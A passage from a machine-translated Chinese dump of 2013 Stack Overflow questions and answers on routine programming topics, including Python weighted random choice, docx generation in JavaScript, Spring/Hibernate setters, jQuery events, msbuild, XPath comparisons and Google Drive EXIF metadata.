p_1 = 0.833
p_2 = 0.067
p_3 = 0.1
r = numpy.random.rand()
if r < p_1:
  v = d1
elif r < (p_1 + p_2):
  v = d1_2
else:
  v = d1_3 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T11:00:27.653

你可以这样计算机会；

**83.3%**

```
import random

rand = random.randint(100,10000) * 0.010

if rand <= 83.3:
    print('success: ' + str(rand))
else:
    print('failed: ' + str(rand)) 
```

**示例结果**

```
192:Desktop allendar$ python test.py
success: 35.7
192:Desktop allendar$ python test.py
success: 60.03
192:Desktop allendar$ python test.py
success: 51.97
192:Desktop allendar$ python test.py
success: 45.58
192:Desktop allendar$ python test.py
failed: 87.53
192:Desktop allendar$ python test.py
success: 33.11
192:Desktop allendar$ python test.py
success: 50.68
192:Desktop allendar$ python test.py
success: 81.8 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-13T12:20:17.160

您还可以使用[Lea](http://code.google.com/p/lea/)，这是一个专门用于离散概率分布的纯 Python 包。

```
>>> distrib = Lea.fromValFreqs(('d1',83.3),('d1_2',6.7),('d1_3',10.))
>>> print distrib.asPct()
  d1 :  83.3 %
d1_2 :   6.7 %
d1_3 :  10.0 %
>>> distrib.random(10)
('d1', 'd1', 'd1', 'd1', 'd1_3', 'd1', 'd1', 'd1', 'd1', 'd1_3') 
```

瞧！

# visual-studio-2012 - vs2012 构建间歇性失败

> ID：15899876
> 
> 赞同：1
> 
> 时间：2013-04-09T10:47:56.453
> 
> 标签：visual-studio-2012, upgrade

我正在尝试将库从 vs2010 升级到 vs2012。它是一个包含 35 个项目的 sln 文件。我使用 devenv.com 来构建它。执行此操作的示例命令如下所示：

> "C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\Tools..\IDE\devenv.com" /rebuild "Release|x64" singlesolution.vc12.sln

行为是间歇性的。它会在第一次调用时失败，有 2 个成功的项目和 33 个失败的项目。在第 2 次调用时，它会通过所有 35 个成功构建。在第三次调用时它会失败。我通过将最大并行构建数设置为 1 来关闭并行构建数。

你能建议我哪里出错了吗？这是 vs2012 的已知行为吗？

# seo - 为什么人员和面包屑数据不显示？

> ID：15899878
> 
> 赞同：0
> 
> 时间：2013-04-09T10:48:06.447
> 
> 标签：seo, microdata, schema.org

在我网站的大多数页面上，我都使用了 Microdata。某些内容，例如创建了数据博客文章，并且评论评级显示在搜索结果中。其他信息，例如 Person 和 Breadcrumb 数据则没有。

## 人

在我的主页上，我有以下代码。将其粘贴到[Google 结构化数据测试工具](http://www.google.com/webmasters/tools/richsnippets)中会显示“Abergavenny Wales - Web Developer”，但将 URL 粘贴到其中并不会显示此内容，知道为什么吗？

```
<div id="banner" itemscope itemtype="http://schema.org/Person">
  <h1>Working <a href="/freelance-web-developer" title="Freelance Web Design & Development">Web Solutions</a></h1>
  <h2>
    <a href="/services/freelance-ruby-on-rails-development-cardiff-abergavenny-wales-uk" title="Freelance Ruby on Rails Web Developer">Ruby on Rails</a>, <a href="/services/freelance-sinatra-ruby-development-cardiff-abergavenny-wales-uk" title="Freelance Sinatra Web Developer">Sinatra</a> &amp; <a href="/services/freelance-drupal-developer-designer-cardiff-abergavenny-wales-uk">Drupal</a> Development by <br class="responsive" /> 
    <a href="http://www.netmagazine.com/features/net-awards-2011-top-10-developers" title=".net Awards 2011: top 10 developers" rel="nofollow">Award Nominated</a> <a href="/freelance-web-developer"><span itemprop="jobtitle">Web Developer</span></a><br class="responsive" /> 
    <span itemprop="address" itemscope itemtype="http://schema.org/PostalAddress">Based in <a href="/services/abergavenny-uk-web-design-development" title="Web Designer & Developer in Abergavenny"><span itemprop="addressLocality">Abergavenny</span></a>, <span itemprop="addressRegion">Wales</span>, <span itemprop="addressCountry">UK</span></span>.
  </h2>
</div> 
```

## 面包屑

面包屑也是如此。以下代码在粘贴到[Google 结构化数据测试工具](http://www.google.com/webmasters/tools/richsnippets)中时有效，但 URL 不返回面包屑。

```
<ol id="breadcrumb">
  <li itemscope itemtype="http://data-vocabulary.org/Breadcrumb">
    <a href="/services" itemprop="url">
      <span itemprop="title">Services</span>
    </a> &#8250;
  </li>  
  <li itemscope itemtype="http://data-vocabulary.org/Breadcrumb">
    <a href="/services/freelance-ruby-on-rails-development-cardiff-abergavenny-wales-uk" itemprop="url">
      <span itemprop="title">Ruby on Rails Development</span>
    </a>
  </li>
</ol> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T20:30:59.597

可能是因为 Google 无法在预览中显示所有内容，而且您的 Google+ 个人资料似乎优先于其他元数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-25T20:59:22.843

我还没有测试过 schema.org 的任何 Person 功能。但是我与一个可以解释我的[人进行了一次愉快的交谈，](https://stackoverflow.com/users/2325248/ajax)[为什么面包屑还不能与 schema.org 一起使用](https://stackoverflow.com/a/17796286/2386943)。愿这个答案也与 Person 相匹配。

另外：此助手还可以帮助您创建有效的微数据：[http ://www.google.com/webmasters/tools/richsnippets](http://www.google.com/webmasters/tools/richsnippets)

# keyboard - 编程键盘选择什么

> ID：15899881
> 
> 赞同：1
> 
> 时间：2013-04-09T10:48:23.330
> 
> 标签：keyboard

对于新键盘的选择，我无法下定决心。在我的日常生活中，我是一名程序员，众所周知，我需要大量使用括号等...我尝试过几种低价和高价的键盘。

目前我正在使用我喜欢的低调罗技键盘，因为我知道当我长时间打字时，低调键会减少指尖疼痛。但是，我也觉得使用低调的键盘，我似乎可以将很多错字写到高/正常高度。

因此，我想知道您在以下方面的经验/提示。

*   低调与机械
*   任何适合编程的键盘知识（特殊字符键位置）
*   关于编程键盘的任何其他有用信息，您可能会觉得有用

感谢您的阅读！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-14T01:40:15.767

我会推荐一个快乐的黑客专业 2 键盘，它有点贵（270 美元）但值得。键盘是由计算机科学家制作的，用于 vi 文本编辑器（您可以谷歌搜索并查看其布局）。我从机械键盘开始使用键盘，我不得不说它是我用于编程的最好的键盘。使用大约三周后，您绝对会爱上这款键盘，在此之前您会觉得它是两极的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-12T21:26:55.770

我同意您的看法，即低调的键似乎会造成拼写错误。我认为问题的一部分是因为按键是死平的，没有弯曲，很难快速将手指放在正确的位置。由于程序员的打字是我们工作的重要组成部分，因此我们需要能够快速、准确且没有不适地打字。

12 个月前，我换了一个 Filco 机械键盘（带棕色开关），再也没有回头。

*   我的打字准确性提高了
*   我没有感到任何手部不适
*   键盘打字很愉快
*   键盘应该可以用很长时间

我还为在家工作购买了 Leopold 键盘。这些键盘的缺点是：

*   嘈杂
*   成本
*   Filco 大键有时会发出吱吱声 - 硅润滑剂可解决此问题

# javascript - 使用 Docx.js 在 JavaScript 中生成 Word 文档？

> ID：15899883
> 
> 赞同：14
> 
> 时间：2013-04-09T10:48:29.913
> 
> 标签：javascript, ms-word, docx

我正在尝试使用[docx.js](https://raw.github.com/stephen-hardy/DOCX.js/master/docx.js)生成 Word 文档，但我似乎无法让它工作。

在修改第 247 行以修复“'textAlign'未定义错误”后，我将原始代码复制到 Google Chrome 控制台中

```
if (inNode.style && inNode.style.textAlign){..} 
```

这使得该功能`convertContent`可用。结果是一个对象，例如

```
JSON.stringify( convertContent($('<p>Word!</p>)[0]) ) 
```

结果是 -

```
"{"string":
      "<w:body>
            <w:p>
                <w:r>
                    <w:t xml:space=\"preserve\">Word!</w:t>
                </w:r>
            </w:p>
       </w:body>"
 ,"charSpaceCount":5
 ,"charCount":5,
 "pCount":1}" 
```

我复制了

```
<w:body>
    <w:p>
        <w:r>
            <w:t xml:space="preserve">Word!</w:t>
        </w:r>
    </w:p>
</w:body> 
```

进入 Notepad++ 并将其保存为扩展名为“docx”的文件，但是当我在 MS Word 中打开它时，却显示“无法打开，因为内容有问题”。

我是否缺少某些属性或 XML 标记或其他东西？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-07-24T13:29:41.690

[您可以使用docxtemplater](https://github.com/open-xml-templating/docxtemplater)（我创建的库）从模板生成 Docx 文档。

它可以用它们的值替换标签（如模板引擎），还可以替换付费版本中的图像。

这是模板引擎的演示：[https ://docxtemplater.com/demo/](https://docxtemplater.com/demo/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-05T13:30:18.413

由于对本地文件（文件夹中的所有内容）的 ajaxCalls，此代码无法在 JSFiddle 上运行`blank`，或者您应该以 ByteArray 格式输入所有文件并使用`jsFiddle`echo API：[http ://doc.jsfiddle.net/使用/echo.html](http://doc.jsfiddle.net/use/echo.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-09-12T14:26:11.900

我知道这是一个较老的问题，你已经有了答案，但我努力让它工作了一天，所以我想我会分享我的结果。

像你一样，我必须`textAlign`通过将行更改为来修复错误：

```
if (inNode.style && inNode.style.textAlign) 
```

此外，它不处理 HTML 注释。`for`因此，我必须在循环中检查“#text”节点上方添加以下行：

```
if (inNodeChild.nodeName === '#comment') continue; 
```

创建 docx 很棘手，因为目前还没有关于这件事的文档。但是查看代码，我看到它期望 HTML 位于 File 对象中。出于我的目的，我想使用我呈现的 HTML，而不是用户必须选择上传的一些 HTML 文件。所以我不得不通过使用它正在寻找的相同属性创建我自己的对象并将其传递进来来欺骗它。为了将它保存到客户端，我使用[FileSaver.js](https://github.com/eligrey/FileSaver.js/)，它需要一个 blob。我**[包含了这个](https://stackoverflow.com/questions/16245767/creating-a-blob-from-a-base64-string-in-javascript)**将 base64 转换为 blob 的函数。所以我实现它的代码是这样的：

```
var result = docx({ DOM: $('#myDiv')[0] });
var blob = b64toBlob(result.base64, "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
saveAs(blob, "test.docx"); 
```

最后，这将适用于简单的 Word 文档，但对于其他任何东西都不是很复杂。我无法渲染我的任何样式，我什至没有尝试让图像正常工作。我已经放弃了这种方法，现在正在研究[DocxgenJS](https://github.com/edi9999/docxgenjs)或一些服务器端解决方案。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-04-05T03:00:10.017

您可能会发现此链接很有用，

> [http://evidenceprime.github.io/html-docx-js/](http://evidenceprime.github.io/html-docx-js/)

这里有一个在线演示：

> [http://evidenceprime.github.io/html-docx-js/test/sample.html](http://evidenceprime.github.io/html-docx-js/test/sample.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-06-04T11:27:00.620

您正在按代码执行正确的操作，但您的文件不是有效的 docx 文件。如果你查看`docx()`docx.js 中的函数，你会发现一个 docx 文件实际上是一个包含多个 xml 文件的 zip。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-12-15T21:17:53.697

我正在使用适用于 JavaScript 的 Open Xml SDK。

[http://ericwhite.com/blog/open-xml-sdk-for-javascript/](http://ericwhite.com/blog/open-xml-sdk-for-javascript/)

基本上，在网络服务器上，我有一个空的 docx 文件作为新模板。当用户在浏览器中单击新的 docx 文件时，我将检索空的 docx 文件作为模板，将其转换为 BASE64 并将其作为 Ajax 响应返回。

在客户端脚本中，您将 BASE64 字符串转换为字节数组并使用 openxmlsdk.js 将字节数组加载为 javascript OpenXmlPackage 对象。

一旦你加载了包，你就可以使用常规的 OpenXmlPart 创建一个真实的文档。（插入图像，创建表/行）。

最后一步是将其作为文档流式传输给最终用户。这部分与安全相关。在我的代码中，我将其发送回网络服务器并临时保存。并准备一个 http 响应以通知最终用户下载它。

检查上面的 URL，有一些有用的示例在 JavaScript 中执行此操作。

# spring - Bean 属性“sessionFactory”不可写或设置方法无效。

> ID：15899884
> 
> 赞同：2
> 
> 时间：2013-04-09T10:48:31.347
> 
> 标签：spring, hibernate

这是我的实用程序 java 文件：

```
public class HibernateUtil {

    private static SessionFactory sessionFactory  = null;

    public static SessionFactory getSessionFactory() {
        return sessionFactory;
    }

    public static void setSessionFactory(SessionFactory sessionFactory) {
        HibernateUtil.sessionFactory = sessionFactory;
    }
} 
```

Spring-servlet.xml：

```
 <bean id="HibernateUtil" class="com.chrysler.Utilities.HibernateUtil">
        <property name="sessionFactory" ref="sessionFactory"></property>
    </bean>
    <bean id="sessionFactory"
        class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
        <property name="configLocation">
            <value>/WEB-INF/hibernate.cfg.xml</value>
        </property>
    </bean> 
```

当我运行它时，我收到以下错误：

> org.springframework.beans.NotWritablePropertyException：bean 类 [com.chrysler.Utilities.HibernateUtil] 的无效属性“sessionFactory”：bean 属性“sessionFactory”不可写或具有无效的 setter 方法。setter 的参数类型是否与 getter 的返回类型匹配？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:53:38.740

使 sessionFactory 的访问器方法非静态

# jquery - 在 for 循环中动态创建的 html 元素的 Onclick 事件

> ID：15899885
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:48:33.563
> 
> 标签：jquery, html, json, tree

我有一个带有树状数据的 json 对象。我想以交互方式在 UI 上显示它。单击组件时，应显示其子组件，依此类推。我写了以下代码

```
 <!DOCTYPE html>
            <html>
            <head>

            <script src="jquery-1.9.1.js"></script>
            </head>
            <body>
            <div>
              <ul id="result"></ul>

            </div>
            <script>
            var json_data = {
                "component": "A",
                "status": 0,
                "children": [
                    {
                        "component": "AA",
                        "status": 0,
                        "children": [
                            {
                                "component": "AAA",
                                "status": 0,
                                "children": []
                            },
                            {
                                "component": "AAB",
                                "status": 2,
                                "children": []
                            }
                        ]
                    },
                    {
                        "component": "AB",
                        "status": 0,
                        "children": [
                            {
                                "component": "ABA",
                                "status": 0,
                                "children": []
                            },
                            {
                                "component": "ABB",
                                "status": 1,
                                "children": []
                            }
                        ]

                    }
                ]
            };

            $(document).ready($(function(){
                var $result = $('#result');
                start(json_data )
                //Root Node display
                function start(obj)
                {

                    $('<li id="' + obj.component + '">').text(obj.component + '-'+obj.status).appendTo($result);
                    $("#"+obj.component).click(function(){
                        displaychildren(obj);
                    });

                }
                Display the children of an element on click by recursion
                 function displaychildren(node)
                {
                    $.each(node.children,function (i,v){
                            $('<li id="' + v.component + '">').text(v.component + '-'+v.status).appendTo($result);                                                    
                            if$("#"+v.component).click(function(){
                            alert("Problem is here");
                            displaychildren(v);
                            });

                        });                     
                }
                }); 
```

我面临的问题是 displaychildren 函数中元素的 onclick 不起作用。如果删除了 onclick 条件，则所有组件的所有元素都将被显示。我希望仅显示所选组件的子项。有谁知道是什么导致了这个问题

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:50:24.960

您的语法有错误：

```
if$("#"+v.component).click(function(){ 
```

应该是（如果你的意思是这样的话）：

```
if($("#"+v.component).click(function(){ 
```

我猜你的代码应该是：

```
$("#"+v.component).click(function(){
                            alert("Problem is here");
                            displaychildren(v);
                            } 
```

因为 if() 在 click 事件周围没有多大意义。

# asp.net-mvc - 是否可以在 MVC3 ViewModel 中传递 EF 实体并且不会因延迟加载而导致性能问题？

> ID：15899895
> 
> 赞同：1
> 
> 时间：2013-04-09T10:49:05.653
> 
> 标签：asp.net-mvc, asp.net-mvc-3, entity-framework, viewmodel

我想在视图模型的属性中传递一个 EF 实体，但我担心它可能会导致性能问题，因为数据库记录的某些列值很大。然后我意识到，除非我访问那些特定的字段，否则我不会因为延迟加载而受到惩罚。它是否正确？

因此，详细说明，在下面的示例中，书籍属性可能称为 ABSTRACT，它是一个字符串，在数据库中是 VARCHAR(MAX)。它还可能有 ID、AUTHOR 和 TITLE：

```
 public class vmTest
   {
   public Book MyBook { get; set; }
   } 
```

如果我只想访问 ID 和 TITLE，那么如果我的理论是正确的，那么 ABSTRACT 列将不会加载到 RAM 中，因此不会导致性能问题。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:14:09.657

据我所知，当您请求 MyBook 时，所有整数、字符串都会从数据库中加载。延迟加载仅适用于引用的实体。

这实际上是 ViewModel 的理想情况。创建 ViewModel 并仅使用您需要的数据加载它。所以在控制器中：

```
var toView = context.Books.Select(e => new YourViewModel { BookID = e.ID, Title = e.Title}).SingleOrDefault(vm => YourFilter(vm));

public class YourViewModel
{
    public int BookID { get; set;}
    public string Title { get; set;}
} 
```

这样做，您只加载您需要的数据，因为 select 语句将在 db 中进行适当的投影。

# visual-studio-2010 - 文件更改后 msbuild.exe 不会提供新的输出

> ID：15899898
> 
> 赞同：3
> 
> 时间：2013-04-09T10:49:09.647
> 
> 标签：visual-studio-2010, msbuild, solution

最近，我通过构建 dll 遇到了 msbuild.exe 的问题。我的想法是从 DOS 命令行调用 msbuild 以自动创建 DLL 而无需打开 MS Visual Studio。我正在使用的命令行（例如）是：

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\example.sln  /p:Configuration=example_config 
```

问题是，即使我更改了此项目中的文件（MS Visual Studio 之外），msbuild.exe 似乎也无法识别更改并仍根据旧文件输出旧 dll。

我也尝试事先删除输出 DLL，但结果仍然相同。来自 DOS 的命令行提供了旧的 dll。

如果我打开 Visual Studio 并手动构建输出，则不会发生此问题。

我在网上查了一下，但找不到可行的解决方案。有人提到这可能是MS的问题。实际上，我在 Windows XP 下也没有遇到这个问题。

我在用

*   项目清单
*   窗口 7 64 位版本
*   微软视觉 C++ 2010
*   该解决方案包含几个子项目，它们分别将库作为输出提供。

如果有人可以提供帮助，我将非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T15:23:27.747

您可以通过从命令行调用 Visual Studio 2010 来构建您的项目。要在不打开 Visual Studio 的情况下构建，请调用“devenv.com”（命令行友好的 Visual Studio 可执行文件）来构建项目。有关 devenv 命令行使用的更多信息可以[在 MSDN](http://msdn.microsoft.com/en-us/library/xee0c8y7%28v=vs.100%29.aspx)上找到。

自定义以下命令并从命令提示符运行它以构建您的项目：

```
"%VS100COMNTOOLS%..\IDE\devenv.com" "full-path-to-solution" /Rebuild "desired-configuration" /Project "full-path-to-project" 
```

# javascript - 使用 Javascript 重置元标记

> ID：15899906
> 
> 赞同：0
> 
> 时间：2013-04-09T10:49:19.270
> 
> 标签：javascript, html

在我发起一个 JS 应用程序后，我正在使用这两个函数来设置和重置元标记

```
function setMeta(){
        alert("meta set");
        $('meta[name=viewport]').attr('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0');
    }

function resetMeta(){
        alert("meta reset");
        $('meta[name=viewport]').attr('content', ' width=device-width, initial-scale=1.0,maximum-scale=1.6, user-scalable=yes, user-scalable=1');
} 
```

我的问题：初始比例属性的默认值是什么。如果我不重置它，它会保持设置为 1.0。

更新问题：如果我打开我的 JS 应用程序的页面被缩放。当我打开对话框时，页面没有像 setMeta 函数那样设置为 1.0 缩放。问题可能出在哪里？其他属性像`user-scalable`工作正常......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:59:34.640

默认值为`1.0`，请参阅[此页面](http://www.developer.nokia.com/Resources/Library/Web/#!nokia-browsers/symbian-browsers/browser-73/viewport-meta-tag-support.html)：

> viewport initial-scale 参数指定网页第一次显示时的比例（缩放）。**默认值 1.0 指定不缩放**。最大 10 的较大值会放大（放大）页面，而较小的值（最大 0.1）会缩小（缩小）页面。

* * *

要将其设置为之前的值，只需存储它。

```
function setMeta(){
        alert("meta set");
        oldcontent=$('meta[name=viewport]').attr('content') //store the current value
        $('meta[name=viewport]').attr('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0');
}

function resetMeta(){
        alert("meta reset");
        $('meta[name=viewport]').attr('content', oldcontent);
} 
```

# sql-server - 使用 sqlcmd 从远程服务器捕获数据并将 excel 文件放入其他服务器

> ID：15899912
> 
> 赞同：0
> 
> 时间：2013-04-09T10:49:50.187
> 
> 标签：sql-server, database, batch-file, sqlcmd

我已经使用 sqlcmd 从远程服务器捕获所需的数据，这很好。

我在批处理文件中使用了以下查询 -

```
>>"Output_hvac.xls" echo %date% %time%
>>"Output_hvac.xls" SQLCMD ... 
```

现在这个批处理文件保存在本地机器上，因此当它运行时会产生一个输出 _hvac excel 文件。

我希望这个 excel 文件存储在没有安装 sql server 的其他服务器中。批处理必须在本地计算机上运行，​​并且要在服务器上更新 excel 工作表。现在我可以访问服务器但如果我我正在尝试使用以下查询来执行此操作，它显示访问被拒绝。

```
>>"//172......./d$/Output_hvac.xls" echo %date% %time%
    >>"Output_hvac.xls" SQLCMD ... 
```

现在我该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:11:22.577

使用 sqlcmd 命令时需要正式连接到远程服务器。

查看 -S 参数：

> -S [protocol:]server[\instance_name][,port] 指定要连接的 SQL Server 实例。它设置 sqlcmd 脚本变量 SQLCMDSERVER。
> 
> 指定 server_name 以连接到该服务器计算机上的默认 SQL Server 实例。指定 server_name [ instance_name ] 以连接到该服务器计算机上的 SQL Server 命名实例。
> 
> 如果未指定服务器计算机，则 sqlcmd 将连接到本地计算机上的默认 SQL Server 实例。从网络上的远程计算机执行 sqlcmd 时需要此选项。协议可以是 tcp (TCP/IP)、lpc（共享内存）或 np（命名管道）。如果您在启动 sqlcmd 时未指定 server_name [ \instance_name ]，则 SQL Server 会检查并使用 SQLCMDSERVER 环境变量。

[关于msdn](http://msdn.microsoft.com/en-us/library/ms162773.aspx)的完整文章。

# jquery - 连同 jQuery Ajax 请求一起发送 cookie

> ID：15899913
> 
> 赞同：5
> 
> 时间：2013-04-09T10:49:52.837
> 
> 标签：jquery, web-services, jquery-mobile, cookies

我正在使用以下方法将 jQuery Ajax 请求发送到 .net 支持的 Web 服务。我的 cookie 发送没有任何问题。但是当我尝试强制刷新（Ctrl + F5）时，cookies被省略并且请求类型也显示为`OPTION`不`GET`

```
$.ajax({            
 type: "GET",
 url: url,
 data: param,
 contentType:"application/json; charset=utf-8",
 dataType: "json",
 success: successFunc,
 error: errorFunc,
 beforeSend:function(){$.mobile.loading('show');},
 complete:function(){$.mobile.loading('hide');}
}); 
```

我的请求在同域中，所以我希望同域来源策略在这里不会成为问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-10T07:28:10.073

```
 $.ajax( {

      //Just add this code 
       xhrFields: {
         withCredentials: true 
       }

     }); 
```

# c# - 通过网站为 Arduino 进行串行通信

> ID：15899915
> 
> 赞同：1
> 
> 时间：2013-04-09T10:50:04.893
> 
> 标签：c#, asp.net, serial-port, arduino, communication

我正在做一个处理 Arduino 的项目。我们用 C# 开发了一个用于导航汽车的表单应用程序。表单应用程序中的导航正常工作，没有任何问题。

这是驾驶汽车的相应代码（这是整个表单应用程序）。

[http://pastebin.com/5JuuyUh7](http://pastebin.com/5JuuyUh7)

ASP.NET 网站无法与 Arduino 通信。按任何按钮导航汽车都不起作用。

[http://pastebin.com/MnjHVMHd](http://pastebin.com/MnjHVMHd)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:33:29.257

您意识到您需要在每个请求中重新打开串行端口，或者将串行端口对象存储在会话中并在每个请求开始时检索它？

从您的代码中，单击任何按钮都不会执行任何操作，因为串行端口未打开，或者在 button2 的情况下，打开但没有发送任何内容。

尽管它看起来像，asp.net 不是有状态的。每次都需要重建状态

# php - 联系表格 - 使用 gmail smtp 服务器 - 在 php 中使用联系表格时如何显示客户电子邮件

> ID：15899916
> 
> 赞同：0
> 
> 时间：2013-04-09T10:50:06.140
> 
> 标签：php, mysql, contact-form

我已经建立了一个联系表格，除了一个问题之外它可以完美地工作。测试表单时，它不显示客户的电子邮件地址。它只显示发送给“我”的电子邮件和消息。

我使用以下 php 代码：

```
$name = $_POST['name'];
$email = $_POST['email'];
$message = $_POST['message'];

if (empty($name) === true || empty($email) === true || empty($message) === true) {
$errors[] = 'Name, email and message are required!';
} else {
if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
$errors[] = 'That\'s not a valid email address';
}
if (ctype_alpha($name) === false) {
$errors[] = 'Name must only contain letters!';
}
} 

if (empty($errors) === true) {
mail('*****', 'Question', $message, 'From: ' . $email);
header('Location: contactus.php?sent');
exit(); 
}

}
?> 
```

联系我们表格的重点是让企业拥有联系他们的人的姓名和电子邮件。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:06:35.680

您的主机/ISP/OS 等很可能不允许您从不属于您的电子邮件地址发送邮件 - [php 邮件“发件人”标头有问题](https://stackoverflow.com/questions/2014081/problem-with-php-mail-from-header)，因此您将看不到电子邮件地址！

将 $email 附加到 $message 或类似内容的更好主意。

```
$message="FROM: $email /n " . $message;
mail('*****', 'Question', $message, 'From: ' . $email); 
```

# xpath - 选择多个值并使用 XQuery 或 XPath 比较它们？

> ID：15899919
> 
> 赞同：1
> 
> 时间：2013-04-09T10:50:09.690
> 
> 标签：xpath, xquery

我有以下 XML：

```
<items>
 <item min="1" max="3"> </item>
 <item min="2" max="7"> </item>
 <item min="1" max="2"> </item>
</items> 
```

如果最小值总是小于最大值，我需要检查每个项目。此输入的预期输出将`false`不`@min="2"`小于`@max="2"`。

我试过类似的东西：

```
every $min,$max  in //item/@min, //item/@max satisfies ... 
```

但这显然行不通。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:30:01.100

您不需要使用`satisfies`，只需反转条件并使用`not(...)`。

此查询将返回`@min`满足条件的所有属性：

```
//item/@min[not(. >= //item/@max)] 
```

如果要使用`satisfies`，请使用以下查询：

```
//item/@min[every $max in //item/@max satisfies . < $max] 
```

* * *

如果您想知道是否所有元素都满足条件，请检查没有元素不满足条件：

```
not(//item/@min[. >= //item/@max]) 
```

您甚至可以不使用谓词（XPath/XQuery 比较具有类似集合的语义，这意味着当一个`@min`值等于或大于一个`@max`值时为真）：

```
not(//item/@min >= //item/@max) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T14:04:11.220

您没有很清楚地表达您的要求，但听起来好像您希望最高@min小于最低@max，这将是

```
max(item/@min) lt min(item/@max) 
```

# search - 地理标记和 Google Drive 搜索

> ID：15899921
> 
> 赞同：2
> 
> 时间：2013-04-09T10:50:11.810
> 
> 标签：search, google-drive-api, exif, geotagging

我有以下情况：我的应用程序存储在 Google Drive 上的图片在 EXIF 数据中写入了 GPS 位置。[看这里。](https://stackoverflow.com/questions/10531544/write-geotag-jpegs-exif-data-in-android/15645984#15645984) 我想稍后使用该位置进行附加索引。甚至可以从一个友好的 Google API 中获取街道地址。但在我看来，GPS 数据与谷歌索引没有明显的整合。如果我将它们留在 EXIF 标头中，我[什至无法使用 Drive API 访问它们](http://googleappsdeveloper.blogspot.com/2013/03/even-more-image-metadata-for-google.html). 所以，我唯一的选择似乎是拉取JPEG文件，自己解析EXIF，调用Google Maps API获取街道地址（这个还没试过，假设有这样的方法），然后推送地址数据回到我的“元”、“描述”或“可索引文本”。或者我可以在存储 JPEG 时将 GPS 坐标直接推送到我的元数据（毕竟只有 2 个带符号的浮点数）。这有效地复制了 EXIF 信息（我喜欢重复数据）。所以我的问题是：我是否遗漏了一些明显的东西？是否有计划在 Google Drive 级别执行此“EXIF GPS 数据”->“街道地址”？它已经存在了吗？我应该自己做还是等待？谢谢，肖恩

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T11:09:46.710

Google Drive SDK 返回一个[`imageMediaMetadata`](http://googleappsdeveloper.blogspot.ch/2013/03/even-more-image-metadata-for-google.html)包含图像基本属性和 EXIF 信息的图像文件字段。目前，Drive 不会对 EXIF 元数据上的地理坐标进行反向地理编码以提供街道地址。

根据您的规模和性能要求，您可以自行提取它们，也可以使用API 返回的[图像元数据](http://googleappsdeveloper.blogspot.ch/2013/03/even-more-image-metadata-for-google.html)，然后使用 Google Maps API 进行反向地理编码。您可以使用[自定义文件属性](https://developers.google.com/drive/properties)来附加地址。属性是可查询的，您可以在它们之上构建搜索功能。示例属性实体如下所示。阅读文档以获取更多详细信息。

```
{
  "key": "address",
  "value": "City of Westminster, WC2N 5DN, United Kingdom",
  "visibility": "PRIVATE"
} 
```

# wordpress - 单击时打开 Wordpress 下拉菜单

> ID：15899922
> 
> 赞同：1
> 
> 时间：2013-04-09T10:50:13.350
> 
> 标签：wordpress, drop-down-menu, menu, jquery

我正在尝试制作一个单击即可打开的 wordpress 下拉菜单。问题是当您选择一个帖子并且页面加载该帖子时它应该保持打开状态。问题是我正在使用自定义菜单项链接，它锚链接到任何内容（“#”）只是为了使它们可点击。当我单击“可点击的 2 级标题项目”时，菜单会打开，但“3 级帖子”上的链接不起作用，但当我单击它们时菜单会关闭。

HTML：

```
<li id="menu-item-272" class="main menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-272"><a href="#">Main menu title item</a>
<ul class="sub-menu" style="display: block;">
    <li id="menu-item-740" class="third menu-item menu-item-type-post_type menu-item-object-post menu-item-740"><a href="http://xyz.com">Post 1st lvl</a></li>
    <li id="menu-item-741" class="third menu-item menu-item-type-post_type menu-item-object-post menu-item-741"><a href="http://xyz.com">Post 1st lvl</a></li>
    <li id="menu-item-742" class="third menu-item menu-item-type-post_type menu-item-object-post menu-item-742"><a href="http://xyz.com">Post 1st lvl</a></li>
    <li id="menu-item-743" class="third menu-item menu-item-type-post_type menu-item-object-post menu-item-743"><a href="http://xyz.com">Post 1st lvl</a></li>
    <li id="menu-item-744" class="second bez menu-item menu-item-type-custom menu-item-object-custom menu-item-744"><a href="#">Clickable 2nd level title item</a>
    <ul class="sub-menu" style="display: none;">
        <li id="menu-item-288" class="third menu-item menu-item-type-taxonomy menu-item-object-category menu-item-type-post_type menu-item-object-post menu-item-288"><a href="http://xyz.com">Post 3rd lvl</a></li>
